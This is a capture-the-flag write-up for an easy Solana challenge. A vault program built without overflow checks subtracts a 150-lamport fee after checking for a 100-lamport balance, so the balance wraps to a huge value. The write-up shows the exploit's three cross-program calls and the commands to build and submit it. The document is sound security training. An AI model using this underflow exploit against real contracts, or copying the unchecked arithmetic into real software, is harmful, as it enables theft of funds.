# H7Corp Token Vault

**Category:** Blockchain  **Difficulty:** Easy  **Author:** Abu

> H7Corp operates a secure token vault system on Solana where users can deposit and withdraw lamports. The vault includes a VIP maintenance fee feature for users with at least 100 lamports in their vault. You start with 200 lamports. Grow your balance to 1,000,000 lamports or more to capture the flag. Download the source code, analyze the program, write your exploit, and submit the compiled .so file.

Handout: `token-vault-player.tar.gz` (same as `player-dist/`). Run: `cd challenge && docker compose up --build`, port 5001. Built on OtterSec's sol-ctf-framework.

## Solution

`PayFee` checks one number and subtracts another:

```rust
pub const MAINTENANCE_FEE: u64 = 150;
pub const VIP_THRESHOLD: u64 = 100;

if vault.balance >= VIP_THRESHOLD {
    vault.balance -= MAINTENANCE_FEE;
```

The program is built with `overflow-checks = false`, so a vault holding exactly 100 lamports wraps to `u64::MAX - 49` instead of panicking. The exploit program does three CPIs:

```rust
invoke(&deposit(*vault_program, *user, 100), accounts)?;   // balance = 100
invoke(&pay_fee(*vault_program, *user), accounts)?;        // 100 - 150 wraps
invoke(&withdraw(*vault_program, *user), accounts)?;       // cash out
```

Build it and send it:

```
cd solve && make && cd ..          # target/deploy/solve.so
python3 solve.py <host> 5001
```

Flag: dynamic per container, `H7CTF{1nt3g3r_und3rfl0w_wr4ps_4r0und_<uuid>}`
